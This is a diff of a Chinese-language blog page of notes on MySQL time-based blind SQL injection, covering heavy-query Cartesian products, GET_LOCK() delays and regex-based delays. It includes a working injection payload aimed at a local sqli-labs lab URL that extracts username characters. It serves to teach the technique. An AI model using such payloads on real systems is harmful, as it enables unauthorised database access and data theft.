+<p><a class="link" href="https://www.sqlinjection.net/heavy-query/"  target="_blank" rel="noopener"
+    >Time-Based Blind SQL Injection using Heavy Query</a></p>
+<p>FROM关键词之后跟多个表，结果就会是不同表的每条记录之间的所有组合：</p>
+<p><a class="link" href="http://t.csdn.cn/g9wHF"  target="_blank" rel="noopener"
+    >from 两个表，没有join。是两表自然连接！！！</a></p>
+<p>因此通过查询多个表合集来造成大量的查询，导致查询时间变长造成延迟</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">C</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果判断的结果为false，则不会执行后面的耗时的查询；</p>
+<p>如果判断的结果为true，则执行后main耗时的查询，发现响应的时间边长，也就知道了判断结果成为true</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="o">/</span><span class="n">sqli</span><span class="o">/</span><span class="k">Less</span><span class="o">-</span><span class="mi">5</span><span class="o">/</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and ascii(substr((select username from users limit 0, 1),1,1)) &lt; 50 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
-</span></span></span></code></pre></div><figure><img src="/ox-hugo/2022-03-24_19-54-12_screenshot.png" width="400px"/>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><figure><img src="/ox-hugo/2022-03-24_19-54-12_screenshot.png" width="400px"/>
 </figure>
 
-<h4 id="get-lock">- <code>GET_LOCK()</code></h4>
+<h4 id="get-lock"><code>GET_LOCK()</code></h4>
 <p><a class="link" href="https://blog.csdn.net/weixin_40006763/article/details/111687849"  target="_blank" rel="noopener"
-    >https://blog.csdn.net/weixin_40006763/article/details/111687849</a>
-mysql_pconnect(server,user,pwd,clientflag)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysqlp_connect() 函数 打开一个到 MySQL 服务器的持久连接 mysqlpconnect() 和 mysqlconnect() 非常相似，但有两个主要区别： 1、当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的(持久)连接， 如果找到，则返回此连接标识而不打开新连接。 2、当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用 (mysqlclose() 不会关闭由 mysql_pconnect() 建立的连接).
-</span></span></code></pre></div><p>get_lock(str,timeout)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Tries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。 在一个session中锁定变量，同时通过另外一个session执行，将会产生延时
-</span></span></code></pre></div><p>也就是说此方法只有在数据库的连接是持久连接的时候才能生效 举个栗子： 打开两个mysql的shell 现在一个shell中执行命令 select getlock(&lsquo;sdpc&rsquo;,5) 先上锁 然后另外一个shell中执行重复的命令 第二个shell中便出现延迟 延迟的时间由第二个shell的getlock中的参数决定.So，在我们写脚本的时候，先加锁，再进行盲注即可(使用requests库时注意加锁和盲注不要在同一个session下)</p>
-<h4 id="正则bug">- 正则bug</h4>
+    >mysql延时注入_Sql注入的几种有趣操作</a></p>
+<p>mysql_pconnect(server,user,pwd,clientflag)
+:</p>
+<!-- raw HTML omitted -->
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysqlp_connect() 函数 打开一个到 MySQL 服务器的持久连接 mysqlpconnect() 和 mysqlconnect() 非常相似，但有两个主要区别： 1、当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的(持久)连接， 如果找到，则返回此连接标识而不打开新连接。 2、当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用 (mysqlclose() 不会关闭由 mysql_pconnect() 建立的连接).
+</span></span></code></pre></td></tr></table>
+</div>
+</div><dl>
+<dt>get_lock(str,timeout)</dt>
+<dd><ul>
+<li>打开一个名为str的锁，并且给予timeout作为锁的有效时长；</li>
+<li>如果timeout为负数，则表示无限锁住；</li>
+<li>当一个session上锁之后，其他的session无法访问；</li>
+</ul>
+</dd>
+</dl>
+<p>也就是说此方法只有在数据库的连接是持久连接的时候才能生效 举个例子：</p>
+<ol>
+<li>打开两个mysql的shell;</li>
+<li>先在一个shell中执行命令 select getlock(&lsquo;sdpc&rsquo;,5) 先上锁;</li>
+<li>然后在另外一个shell中执行重复的命令，第二个shell中便出现延迟，延迟的时间由第二个shell的getlock中的参数决定.</li>
+</ol>
+<p>因此在我们写脚本的时候，先加锁，再进行盲注即可(使用requests库时注意加锁和盲注不要在同一个session下)</p>
+<h4 id="正则bug">正则bug</h4>
 <p><a class="link" href="https://xz.aliyun.com/t/2288"  target="_blank" rel="noopener"
-    >https://xz.aliyun.com/t/2288</a>
-这是一个老生常谈的问题了，但之前可能很少会把它放到注入里讨论。</p>
-<p>正则匹配在匹配较长字符串但自由度比较高的字符串时，会造成比较大的计算量，我们通过rpad或repeat构造长字符串，加以计算量大的pattern，通过控制字符串长度我们可以控制延时。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql&gt; select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);
+    >mysql 延时注入新思路</a></p>
+<p>这是一个老生常谈的问题了，但之前可能很少会把它放到注入里讨论。</p>
+<p>正则匹配在匹配较长字符串但自由度比较高的字符串时，会造成比较大的计算量，我们通过 <code>rpad</code> 或 <code>repeat</code> 构造长字符串，加以计算量大的pattern，通过控制字符串长度我们可以控制延时：</p>
+<dl>
+<dt>RPAD(str, len, padstr)</dt>
+<dd><ul>
+<li>向str右侧重复填充padstr字符串，直到总长度达到len</li>
+<li>如果是LPAD就是向左填充</li>
+</ul>
+</dd>
+<dt>RLIKE pattern</dt>
+<dd><ul>
+<li>使用pattern中的正则表达式进行匹配</li>
+</ul>
+</dd>
+<dt>REPEAT(str, count)</dt>
+<dd><ul>
+<li>返回重复count次的str</li>
+</ul>
+</dd>
+</dl>
+<!-- raw HTML omitted -->
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql&gt; select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);
 </span></span><span class="line"><span class="cl">+-------------------------------------------------------------+
 </span></span><span class="line"><span class="cl">| rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) |
 </span></span><span class="line"><span class="cl">+-------------------------------------------------------------+
 </span></span><span class="line"><span class="cl">|                                                           0 |
 </span></span><span class="line"><span class="cl">+-------------------------------------------------------------+
 </span></span><span class="line"><span class="cl">1 row in set (5.22 sec)
-</span></span></code></pre></div>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
@@ -669,7 +1060,7 @@ mysql_pconnect(server,user,pwd,clientflag)</p>
 
 
         <span>
-            Last updated on Apr 20, 2022 22:13 &#43;0100
+            Last updated on Sep 29, 2022 15:15 CST
         </span>
     </section></footer>
 
@@ -910,29 +1301,29 @@ mysql_pconnect(server,user,pwd,clientflag)</p>
   <ul>
     <li><a href="#sql-injection-blind-injection">SQL Injection: Blind injection</a>
       <ul>
-        <li><a href="#1-dot-布尔盲注">1. 布尔盲注</a>
+        <li><a href="#布尔盲注">布尔盲注</a>
           <ul>
             <li><a href="#left">- <code>left()</code></a></li>
-            <li><a href="#substr-ascii">- <code>substr()</code> <code>ascii()</code></a></li>
+            <li><a href="#substr-and-ascii">- <code>substr()</code> &amp; <code>ascii()</code></a></li>
             <li><a href="#ord-and-mid">- <code>ORD()</code> and <code>MID()</code></a></li>
             <li><a href="#regexp">- <code>regexp</code></a></li>
             <li><a href="#like-匹配注入">- <code>like</code> 匹配注入</a></li>
           </ul>
         </li>
-        <li><a href="#2-dot-报错盲注">2. 报错盲注</a>
+        <li><a href="#报错盲注">报错盲注</a>
           <ul>
-            <li><a href="#bigint数据类型溢出报错注入">- BigInt数据类型溢出报错注入</a></li>
-            <li><a href="#参数格式错误">- 参数格式错误</a></li>
-            <li><a href="#主键重复">- 主键重复</a></li>
+            <li><a href="#bigint数据类型溢出报错注入">BigInt数据类型溢出报错注入</a></li>
+            <li><a href="#参数格式错误">参数格式错误</a></li>
+            <li><a href="#主键重复">主键重复</a></li>
           </ul>
         </li>
-        <li><a href="#3-dot-时间盲注">3. 时间盲注</a>
+        <li><a href="#时间盲注">时间盲注</a>
           <ul>
-            <li><a href="#sleep">- <code>sleep()</code></a></li>
-            <li><a href="#benchmark">- <code>Benchmark()</code></a></li>
-            <li><a href="#笛卡尔积-heavy-query">- 笛卡尔积（heavy query）</a></li>
-            <li><a href="#get-lock">- <code>GET_LOCK()</code></a></li>
-            <li><a href="#正则bug">- 正则bug</a></li>
+            <li><a href="#sleep"><code>sleep()</code></a></li>
+            <li><a href="#benchmark"><code>Benchmark()</code></a></li>
+            <li><a href="#笛卡尔积-heavy-query">笛卡尔积（heavy query）</a></li>
+            <li><a href="#get-lock"><code>GET_LOCK()</code></a></li>
+            <li><a href="#正则bug">正则bug</a></li>
           </ul>
         </li>
       </ul>
